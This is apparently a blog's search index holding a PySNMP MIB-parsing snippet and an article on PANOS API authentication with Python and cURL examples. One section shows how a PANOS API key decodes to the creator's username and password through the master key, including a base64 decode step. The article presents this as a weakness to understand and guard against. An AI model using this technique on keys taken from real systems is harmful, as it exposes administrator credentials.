<p>What we can do is use the mib_view class instance that we previously created. Lets first take a look at what this mib_view is. We can see that it is a MIB View controller:</p> <pre><code>&gt;&gt;&gt; type(mib_view)\n&lt;class 'pysnmp.smi.view.MibViewController'&gt;\n</code></pre> <p>If you want to see the various class functions that it has, try using Python's built-in help function like so: <code>help(mib_view)</code>. You can see that there is a class function called getNodeName(), which actually takes in an ObjectIdentity class and will return the oid, an ordered label tuple with human-readable entries, and the suffix which in our case is the entPhysicalIndex value. We use getNodeName() as follows:</p> <pre><code>oid, label, suffix = mib_view.getNodeName((var_binds[0][0]))\n&gt;&gt;&gt; oid.prettyPrint()\n'1.3.6.1.2.1.47.1.1.1.1.2'\n&gt;&gt;&gt; label\n('iso', 'org', 'dod', 'internet', 'mgmt', 'mib-2', 'entityMIB', 'entityMIBObjects', 'entityPhysical', 'entPhysicalTable', 'entPhysicalEntry', 'entPhysicalDescr')\n&gt;&gt;&gt; suffix.prettyPrint()\n'1'\n</code></pre> <p>With the label we can extract that the response MIB variable binding was for entPhysicalDescr and it was for entPhysicalIndex number 1. In instances where you have many variables in the entPhysicalTable you will need to iterate over the var_binds response object that we queried using the bulkCmd and extract the last value of the label for each as well as the suffix by using the mib_view's getNodeName() class function. The results can then be stored in a Python Dict or List so that you can later write the results where you are storing or reporting on them (e.g. a database, CSV file, etc.)</p>","tags":["Python","Automation"]},{"location":"2022/03/02/parse-pysnmp-object-identities-for-mib-variable-names/#a-complete-example","title":"A Complete Example","text":"<p>To see a complete example of using PySNMP's bulkCmd, querying entPhysicalTable, parsing the returned ObjectIdentities and building a hardware inventory report, check out my network hardware inventory project on Github!</p>","tags":["Python","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/","title":"Palo Alto PANOS API Authentication","text":"<p>In this article we will explore the various methods used for authenticating against Palo Alto's PANOS API which allows administrators to programmatically interface with Palo Alto firewalls and Panorama appliances. The methods discussed cover both the XML and REST API's. There are a few considerations to make when deciding how to configure your appliances to authenticate API requests as well as how to handle API authentication in code.</p>","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#api-authentication-configuration","title":"API Authentication Configuration","text":"","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#minimum-required-configuration","title":"Minimum Required Configuration","text":"<p>The PANOS API requires, at a minimum, that a local administrator account exists with any of the Dynamic administrator types (e.g. superuser, device administrator, etc.). Other than in a lab environment it would not be recommended to use a local account that multiple administrators have access to, for authenticating requests of any form to your appliance. Accounts should always be attributable to a single user or function and given only the access that is necessary for that user/function. This is described in the subsequent section.</p>","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#least-privileged-access-with-admin-roles","title":"Least Privileged Access with Admin Roles","text":"<p>Authenticating administrators to the API should be performed on a user/function basis. If you allow your administrators to use the API, you can configure the firewall admin roles to permit each role the specific level of access that is required. In situations where the API is used programmatically by an external service (e.g. a monitoring platform or some other automated system), it is beneficial to create admin roles for each external service. Each service often requires different levels of access and creating an admin role per service allows the necessary flexibility.</p> <p>For administrator based admin roles (e.g. the roles that authenticate a human logging into the appliance), you can set specific options on the XML API and REST API tabs of the admin role. Unfortunately, the documentation is a bit light on explaining each option for the XML API privileges and you only have the option to enable or disable access. There is greater flexibility for the REST API, similar to how you authorize an administrator to the web UI.</p> <p>For external service based admin roles (e.g. monitoring platforms), a good recommendation to follow is to disable all options across the various tabs of the admin role and then explicitly enable the options required for the external service. The account that an external service uses to programmatically access an appliance should never need to use the web UI. Although outside of the scope of this article, some external services still rely on CLI access and parsing CLI output instead of using API access. Consult the documentation associated with the external service or discuss with those who manage the code that interfaces with your appliances API.</p>","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#authentication-profiles","title":"Authentication Profiles","text":"<p>Your devices authentication settings (Device &gt; Setup &gt; Management &gt; Authentication Settings) allows you to configure an authentication profile for non-local admins. If using SAML to authenticate administrators, starting in PANOS 10.2 you now how have the option to identify an authentication profile/sequence for non-UI access. It is required to configure non-SAML based authentication for accessing the API (and CLI), as redirecting to your IdP login page is not possible for these types of requests.</p> <p>If you're remotely authenticating logins with a method other than SAML, you only need to set the Authentication Profile at the above mentioned path (not the Authentication Profile Non-UI option).</p>","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#api-key-lifetime","title":"API Key Lifetime","text":"<p>A common recommendation is that API keys should be rotated every 30 to 90 days. Palo Alto sets a dangerous default of zero which effectively indicates keys never expire. To adjust API key lifetime browse to Device &gt; Setup &gt; Management &gt; Authentication Settings and set the value for API Key Lifetime (values can be between 0 minutes, no expiration, and 525600 minutes which is 365 days).</p> <p>You should reference your organization best practices when determining to API key lifetime. In some cases the guideline may fall under a more general guideline around user/system authentication.</p> <p>In my opinion, there is no reason that the value shouldn't be similar to that of the standard Idle Timeout for administrator logins, especially if you allow administrators to access the API. If you must be in compliance with NIST or CIS, administrator login idle timeout values usually need to be 20 minutes or less. Although Palo Alto's Idle Timeout is detecting inactivity in an admin session, API key lifetime isn't measured between API calls, but from the point in time the key is generated regardless of how many API queries are made after that. What you may find is that some external platforms/products which use the API don't effectively check for API key duration and renew their API key when making a series of subsequent calls.</p>","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#authentication-examples","title":"Authentication Examples","text":"","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#obtaining-an-api-key","title":"Obtaining an API key","text":"<p>The preferred method for authenticating against the PANOS API is to generate an API key. This ensures that the username and password is only passed once to the device and subsequent API queries pass the timebound API key which will expire (as long as you have properly set an API key lifetime) . To generate an API key can use the /api/$type=keygen URL path on your Palo Alto appliance.</p> <p>Note</p> <p>If you're using special characters in the password, cURL may require that you use different options such as --data-urlencode for submitting form data. This will ensure that cURL interpret the special characters as part of the value associated with a form field and not part of the parametrization of the key/value pairs. In the below example the password has an &amp; character which would fail when using the -d cURL flag but is successfully passed when using --data-urlencode. Python's Request module already URL encodes the data values, so no additional changes are required.</p> <p>Warning</p> <p>Follow best practices when handling any form of credential/secret in code. The intent of this post is not meant to cover secure code practices, but to provide examples of working with the Palo Alto PANOS API.</p> PythoncURLcURL with special character password <p>The following shows using Python's Request package to send a POST request to the PANOS API to generate a new API key. <pre><code>import xml.etree.ElementTree as ET\nimport requests\n\nusername = 'apiuser'\npassword = 'JNn0Sg444s7D0jy5'\nBASE_URL = 'https://192.168.12.50/api/'\nparams = {\n    'type': 'keygen',\n}\nheaders = {\n    'Content-Type': 'application/x-www-form-urlencoded',\n}\ndata = {\n    'user': username,\n    'password': password,\n}\nresp = requests.post(\n    BASE_URL,\n    params=params,\n    headers=headers,\n    data=data,\n    verify=False,\n    timeout=5,\n)\nresp.raise_for_status()\n\nroot = ET.fromstring(resp.text)\nkey = root.find('result/key').text\n\nparams = {\n    'type': 'op',\n    'cmd': '&lt;show&gt;&lt;system&gt;&lt;info&gt;&lt;/info&gt;&lt;/system&gt;&lt;/show&gt;'\n}\nheaders = {\n    'X-PAN-KEY': key,\n}\nresp = requests.get(\n    BASE_URL,\n    params=params,\n    headers=headers,\n    verify=False,\n    timeout=5,\n)\nresp.raise_for_status()\n\nroot = ET.fromstring(resp.text)\noutput = root.find('result/system')\n</code></pre></p> <pre><code>curl -k -H \"Content-Type: application/x-www-form-urlencoded\" \\\n-X POST 'https://192.168.12.50/api/?type=keygen' \\\n-d 'user=apiuser&amp;password=JNn0Sg444s7D0jy5'\n</code></pre> <pre><code>curl -k -H \"Content-Type: application/x-www-form-urlencoded\" \\\n-X POST 'https://192.168.12.50/api/?type=keygen' \\\n-d 'user=apiuser' \\\n--data-urlencode 'password=JNn0Sg444s7D0jy5&amp;'\n</code></pre> <p>A successfully authenticated call to the API keygen path results in an XML response that includes the API key: XML response with API key<pre><code>&lt;response status = 'success'&gt;\n  &lt;result&gt;\n    &lt;key&gt;LUFRPT0xTFE0dHZzVEVMYUV4dlNuUi9GeFFjeVl4cE09R25NSVgyYysyVEw4VmZRakdTazc2cjFKK05HRGhoVXIvRGFYN1lFMHlRUXVwaXhNNjRsTitDNWNaL2pWWjNPbzk5NXhzRGtsQy92NnRudjRyeDh0K3c9PQ==&lt;/key&gt;\n  &lt;/result&gt;\n&lt;/response&gt;\n</code></pre></p>","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#using-the-api-key-in-subsequent-api-calls","title":"Using the API key in subsequent API calls","text":"<p>Now that you have an API key you can use it in subsequent API calls. This example shows running an operational command on the device.</p> PythoncURL <pre><code>import xml.etree.ElementTree as ET\nimport requests\n\nusername = 'apiuser'\npassword = 'JNn0Sg444s7D0jy5'\nBASE_URL = 'https://192.168.12.50/api/'\nparams = {\n    'type': 'keygen',\n}\nheaders = {\n    'Content-Type': 'application/x-www-form-urlencoded',\n}\ndata = {\n    'user': username,\n    'password': password,\n}\nresp = requests.post(\n    BASE_URL,\n    params=params,\n    headers=headers,\n    data=data,\n    verify=False,\n    timeout=5,\n)\nresp.raise_for_status()\n\nroot = ET.fromstring(resp.text)\nkey = root.find('result/key').text\n\nparams = {\n    'type': 'op',\n    'cmd': '&lt;show&gt;&lt;system&gt;&lt;info&gt;&lt;/info&gt;&lt;/system&gt;&lt;/show&gt;'\n}\nheaders = {\n    'X-PAN-KEY': key,\n}\nresp = requests.get(\n    BASE_URL,\n    params=params,\n    headers=headers,\n    verify=False,\n    timeout=5,\n)\nresp.raise_for_status()\n\nroot = ET.fromstring(resp.text)\noutput = root.find('result/system')\n</code></pre> <pre><code>curl -k -H \"X-PAN-KEY: LUFRPT1Hd3dCOC80S3hqd1lMU01lbnBpOEN1MENkbEU9R25NSVgyYysyVEw4VmZRakdTazc2bnZNZnplcTdxVmpabGNTRnY3cENLNEEzaFpBbDM3N21xYlFYRjdJOFZOWDk1ajNTVTgrUGFlWU1PRmkvLzdtMFE9PQ==\" \\\n-G 'https://192.168.12.50/api/' \\\n-d type=op \\\n-d cmd='&lt;show&gt;&lt;system&gt;&lt;info&gt;&lt;/info&gt;&lt;/system&gt;&lt;/show&gt;'\n</code></pre> <p>The XML response to the API query for the operational command of 'show system info' would look like the following: <pre><code>&lt;response status=\"success\"&gt;\n  &lt;result&gt;\n    &lt;system&gt;\n      &lt;hostname&gt;PA-LAB&lt;/hostname&gt;\n      &lt;ip-address&gt;192.168.12.50&lt;/ip-address&gt;\n      &lt;public-ip-address&gt;unknown&lt;/public-ip-address&gt;\n      &lt;netmask&gt;255.255.255.0&lt;/netmask&gt;\n      &lt;default-gateway&gt;192.168.12.1&lt;/default-gateway&gt;\n      &lt;is-dhcp&gt;no&lt;/is-dhcp&gt;\n      &lt;ipv6-address&gt;unknown&lt;/ipv6-address&gt;\n      &lt;ipv6-link-local-address&gt;fe80::8e36:7aff:fe02:418e/64&lt;/ipv6-link-local-address&gt;\n      &lt;mac-address&gt;8c:36:7a:02:41:8e&lt;/mac-address&gt;\n      &lt;time&gt;Wed Apr 30 15:14:34 2025&lt;/time&gt;\n      &lt;uptime&gt;65 days, 8:44:39&lt;/uptime&gt;\n      &lt;devicename&gt;PA-LAB&lt;/devicename&gt;\n      &lt;family&gt;#########&lt;/family&gt;\n      &lt;model&gt;#########&lt;/model&gt;\n      &lt;serial&gt;#########&lt;/serial&gt;\n      &lt;cloud-mode&gt;non-cloud&lt;/cloud-mode&gt;\n      &lt;sw-version&gt;10.2.11-h12&lt;/sw-version&gt;\n      &lt;global-protect-client-package-version&gt;0.0.0&lt;/global-protect-client-package-version&gt;\n      &lt;device-dictionary-version&gt;172-597&lt;/device-dictionary-version&gt;\n      &lt;device-dictionary-release-date&gt;2025/04/25 12:16:03 MDT&lt;/device-dictionary-release-date&gt;\n      &lt;app-version&gt;8971-9419&lt;/app-version&gt;\n      &lt;app-release-date&gt;2025/04/28 16:06:06 MDT&lt;/app-release-date&gt;\n      &lt;av-version&gt;5169-5689&lt;/av-version&gt;\n      &lt;av-release-date&gt;2025/04/29 05:00:05 MDT&lt;/av-release-date&gt;\n      &lt;threat-version&gt;8971-9419&lt;/threat-version&gt;\n      &lt;threat-release-date&gt;2025/04/28 16:06:06 MDT&lt;/threat-release-date&gt;\n      &lt;wf-private-version&gt;0&lt;/wf-private-version&gt;\n      &lt;wf-private-release-date&gt;unknown&lt;/wf-private-release-date&gt;\n      &lt;url-db&gt;paloaltonetworks&lt;/url-db&gt;\n      &lt;wildfire-version&gt;955464-959418&lt;/wildfire-version&gt;\n      &lt;wildfire-release-date&gt;2025/02/24 07:42:12 MST&lt;/wildfire-release-date&gt;\n      &lt;wildfire-rt&gt;Disabled&lt;/wildfire-rt&gt;\n      &lt;url-filtering-version&gt;20250430.20332&lt;/url-filtering-version&gt;\n      &lt;global-protect-datafile-version&gt;unknown&lt;/global-protect-datafile-version&gt;\n      &lt;global-protect-datafile-release-date&gt;unknown&lt;/global-protect-datafile-release-date&gt;\n      &lt;global-protect-clientless-vpn-version&gt;0&lt;/global-protect-clientless-vpn-version&gt;\n      &lt;logdb-version&gt;10.2.1&lt;/logdb-version&gt;\n      &lt;plugin_versions&gt;\n        &lt;entry name='dlp' version='3.0.9'&gt;\n          &lt;pkginfo&gt;dlp-3.0.9&lt;/pkginfo&gt;\n        &lt;/entry&gt;\n      &lt;/plugin_versions&gt;\n      &lt;platform-family&gt;400&lt;/platform-family&gt;\n      &lt;vpn-disable-mode&gt;off&lt;/vpn-disable-mode&gt;\n      &lt;multi-vsys&gt;off&lt;/multi-vsys&gt;\n      &lt;ZTP&gt;Disabled&lt;/ZTP&gt;\n      &lt;operational-mode&gt;normal&lt;/operational-mode&gt;\n      &lt;advanced-routing&gt;off&lt;/advanced-routing&gt;\n      &lt;device-certificate-status&gt;Valid&lt;/device-certificate-status&gt;\n    &lt;/system&gt;\n  &lt;/result&gt;\n&lt;/response&gt;\n</code></pre></p>","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#alternative-authentication-method","title":"Alternative Authentication Method","text":"<p>Warning</p> <p>I would discourage using the method mentioned in this section. The point of covering this is to highlight the method that Palo Alto encourages people to use, and to discuss the reasons for not using this method.</p> <p>Alternatively, Palo Alto encourages you to use HTTP basic auth to authenticate API requests. They make no mention of using the API key that was previously obtained. Generally speaking, basic auth should be discouraged as you are continually passing the username and password in every HTTP request in clear text. Basic auth only base 64 encodes the username and password and is easily reversable (decoded).</p> PythoncURL <pre><code>import xml.etree.ElementTree as ET\nimport requests\nfrom requests.auth import HTTPBasicAuth\n\nusername = 'apiuser'\npassword = 'JNn0Sg444s7D0jy5&amp;'\nBASE_URL = 'https://192.168.12.50/api/'\n\nparams = {\n    'type': 'op',\n    'cmd': '&lt;show&gt;&lt;system&gt;&lt;info&gt;&lt;/info&gt;&lt;/system&gt;&lt;/show&gt;'\n}\nresp = requests.get(\n    BASE_URL,\n    params=params,\n    verify=False,\n    timeout=5,\n    auth=HTTPBasicAuth(username, password)\n)\nresp.raise_for_status()\n\nroot = ET.fromstring(resp.text)\noutput = root.find('result/system')\n</code></pre> <pre><code>curl -k -G 'https://192.168.12.50/api/' \\\n-d type=op \\\n-d cmd='&lt;show&gt;&lt;system&gt;&lt;info&gt;&lt;/info&gt;&lt;/system&gt;&lt;/show&gt;' \\\n-u \"apiuser:JNn0Sg444s7D0jy5&amp;\"\n</code></pre> <p>As you can see in the above examples, the username and password are passed in each API query which makes it more susceptible to compromise. Instead, using the username and password to get an API key which is used in subsequent API queries ensures that the username/password are only used once.</p>","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#additional-notes-on-api-authentication","title":"Additional Notes on API Authentication","text":"","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#expiring-api-keys","title":"Expiring API Keys","text":"<p>Palo Alto provides a mechanism to expire all API keys. Unfortunately this can't be controlled on a key by key basis. Browse to Device &gt; Setup &gt; Management &gt; Authentication Settings and click the Expire All API Keys link.</p> <p>It's not obvious how changing the API key lifetime affects existing API keys. If you allow a long API key lifetime duration or used the default of zero (API keys never expire) and then adjust the lifetime to a lower duration, I would recommend expiring all keys after you have made the change.</p> <p>Also note that subsequent API key generation calls will immediately expire previous API keys associated with the account.</p>","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#palo-alto-panos-api-key-weaknesses","title":"Palo Alto PANOS API Key Weaknesses","text":"<p>Warning</p> <p>The following details provide steps that show how the API key can be decoded and decrypted, resulting in the original username/password used to create the API key being returned. Do not submit production API keys to public sites. If you intend to test this out, only submit an API key used in a lab that you intend to rotate immediately after.</p> <p>If you're curious as to how the decryption is performed and how the following site is handling data you submit in the form, feel free to review the Github repo for panos-crypto-tools. Note that as of the writing of this post, decryption of the API key is done locally in your browser, no data is submitted to an external site. However, always validate beforehand.</p> <p>Although it is not documented on Palo Alto's site, it is well known that Palo Alto PANOS API keys contain the username/password that was used to create the API key in the first place. Although the API key is encrypted, its encrypted using the appliances master key. To make matters worse, very few organizations manage their master key effectively and often leave it set to the default value which is also well known. If a non-default master key is used but becomes compromised, your API keys can also be decrypted.</p> <p>To reverse a PANOS API key you first need to base64decode the key.</p> <pre><code>import base64\nkey = 'LUFRPT1Hd3dCOC80S3hqd1lMU01lbnBpOEN1MENkbEU9R25NSVgyYysyVEw4VmZRakdTazc2bnZNZnplcTdxVmpabGNTRnY3cENLNEEzaFpBbDM3N21xYlFYRjdJOFZOWDk1ajNTVTgrUGFlWU1PRmkvLzdtMFE9PQ=='\nbase64.b64decode(key)\n</code></pre> <p>The above Python code results in the following string being returned. <pre><code>b'-AQ==GwwB8/4KxjwYLSMenpi8Cu0CdlE=GnMIX2c+2TL8VfQjGSk76nvMfzeq7qVjZlcSFv7pCK4A3hZAl377mqbQXF7I8VNX95j3SU8+PaeYMOFi//7m0Q=='\n</code></pre></p> <p>If you take the string contained between the single quotes to the PANOS Crypto Tools site, you can decrypt the string further and see that it returns the username and password you have seen in previous examples within this post.</p>","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#subsequent-api-query-authentication-behaviour","title":"Subsequent API Query Authentication Behaviour","text":"<p>When using an API key across multiple API queries, its important to note that the username and password thats encrypted and encoded within the API key is authenticated for each request. Deleting an admin account or changing its password will render the API key ineffective.</p> <p>Note</p> <p>If admins are remotely authenticated (e.g. using RADIUS) and use a pin+token based password, such as with RSA, any API query after obtaining the API key will fail due to the single-user nature of this type of authentication method. To make subsequent API calls with this type of authentication method refer to the Persistent API Sessions section below.</p> <p>To observe the behaviour, the first step is to generate the API key:</p> <pre><code>curl -k -H \"Content-Type: application/x-www-form-urlencoded\" \\\n-X POST 'https://192.168.12.50/api/?type=keygen' \\\n-d 'user=apiuser' \\\n--data-urlencode 'password=JNn0Sg444s7D0jy5&amp;'\n&lt;response status = 'success'&gt;&lt;result&gt;&lt;key&gt;LUFRPT1IanVrY0k4aUFtUURsaks0MmZ5T2VxNytUckE9R25NSVgyYysyVEw4VmZRakdTazc2bnZNZnplcTdxVmpabGNTRnY3cENLNUl5ZXB4ZDhUVkNJR0Y4VTdXS2pRdFhtU2tPMnp5MEdKejgzTGJsbnpsRmc9PQ==&lt;/key&gt;&lt;/result&gt;&lt;/response&gt;\n</code></pre> <p>Confirm that you're able to query the API using the key:</p> <pre><code>curl -k -H \"X-PAN-KEY: LUFRPT1IanVrY0k4aUFtUURsaks0MmZ5T2VxNytUckE9R25NSVgyYysyVEw4VmZRakdTazc2bnZNZnplcTdxVmpabGNTRnY3cENLNUl5ZXB4ZDhUVkNJR0Y4VTdXS2pRdFhtU2tPMnp5MEdKejgzTGJsbnpsRmc9PQ==\" \\\n-G 'https://192.168.12.50/api/' \\\n-d type=op \\\n-d cmd='&lt;show&gt;&lt;system&gt;&lt;info&gt;&lt;/info&gt;&lt;/system&gt;&lt;/show&gt;'\n&lt;response status=\"success\"&gt;&lt;result&gt;...Removed for brevity...&lt;/result&gt;&lt;/response&gt;\n</code></pre> <p>Then change the password associated with the apiuser account (there isn't a method to disable an account). Query the API again and you'll see that an HTTP 403 error is returned:</p> <pre><code>curl -k -H \"X-PAN-KEY: LUFRPT1IanVrY0k4aUFtUURsaks0MmZ5T2VxNytUckE9R25NSVgyYysyVEw4VmZRakdTazc2bnZNZnplcTdxVmpabGNTRnY3cENLNUl5ZXB4ZDhUVkNJR0Y4VTdXS2pRdFhtU2tPMnp5MEdKejgzTGJsbnpsRmc9PQ==\" \\\n-G 'https://192.168.12.50/api/' \\\n-d type=op \\\n-d cmd='&lt;show&gt;&lt;system&gt;&lt;info&gt;&lt;/info&gt;&lt;/system&gt;&lt;/show&gt;'\n&lt;response status = 'error' code = '403'&gt;&lt;result&gt;&lt;msg&gt;Invalid Credential&lt;/msg&gt;&lt;/result&gt;&lt;/response&gt;\n</code></pre> <p>Finally, set the password associated with the apiuser account back to the original password that you used to obtain the API key. Query the API again and you'll see that a successful response is returned:</p> <pre><code>curl -k -H \"X-PAN-KEY: LUFRPT1IanVrY0k4aUFtUURsaks0MmZ5T2VxNytUckE9R25NSVgyYysyVEw4VmZRakdTazc2bnZNZnplcTdxVmpabGNTRnY3cENLNUl5ZXB4ZDhUVkNJR0Y4VTdXS2pRdFhtU2tPMnp5MEdKejgzTGJsbnpsRmc9PQ==\" \\\n-G 'https://192.168.12.50/api/' \\\n-d type=op \\\n-d cmd='&lt;show&gt;&lt;system&gt;&lt;info&gt;&lt;/info&gt;&lt;/system&gt;&lt;/show&gt;'\n&lt;response status=\"success\"&gt;&lt;result&gt;...Removed for brevity...&lt;/result&gt;&lt;/response&gt;\n</code></pre>","tags":["Palo Alto","Automation"]},{"location":"2025/04/29/palo-alto-panos-api-authentication/#persistent-api-sessions","title":"Persistent API Sessions","text":"<p>As mentioned in the above section, if using a remote authentication method that leverages single-use passwords (e.g. pin+token), subsequent API calls will fail in the Python and cURL methods shown so far in this post. However, you can create a Python Requests session object to maintain a persistent HTTP session which allows you to send multiple API queries.</p> Python <pre><code>import xml.etree.ElementTree as ET\nimport requests\n\nusername = 'apiuser'\npassword = 'JNn0Sg444s7D0jy5&amp;'\nBASE_URL = 'https://192.168.12.50/api/'\nparams = {\n    'type': 'keygen',\n}\nheaders = {\n    'Content-Type': 'application/x-www-form-urlencoded',\n}\ndata = {\n    'user': username,\n    'password': password,\n}\n\ns = requests.Session()\nresp = s.post(\n    BASE_URL,\n    params=params,\n    headers=headers,\n    data=data,\n    verify=False,\n    timeout=5,\n)\nresp.raise_for_status()\n\nroot = ET.fromstring(resp.text)\nkey = root.find('result/key').text\n\nparams = {\n    'type': 'op',\n    'cmd': '&lt;show&gt;&lt;system&gt;&lt;info&gt;&lt;/info&gt;&lt;/system&gt;&lt;/show&gt;'\n}\nheaders = {\n    'X-PAN-KEY': key,\n}\nresp = s.get(\n    BASE_URL,\n    params=params,\n    headers=headers,\n    verify=False,\n    timeout=5,\n)\nresp.raise_for_status()\ns.close()\n\nroot = ET.fromstring(resp.text)\noutput = root.find('result/system')\n</code></pre>","tags":["Palo Alto","Automation"]},{"location":"archive/2025/","title":"2025","text":""},{"location":"archive/2022/","title":"2022","text":""},{"location":"archive/2021/","title":"2021","text":""},{"location":"category/programmability/","title":"Programmability","text":""},{"location":"category/automation/","title":"Automation","text":""},{"location":"category/network-security/","title":"Network Security","text":""},{"location":"category/nac/","title":"NAC","text":""},{"location":"category/vulnerabilities/","title":"Vulnerabilities","text":""},{"location":"page/2/","title":"Home","text":""},{"location":"page/3/","title":"Home","text":""},{"location":"archive/2021/page/2/","title":"2021","text":""}]}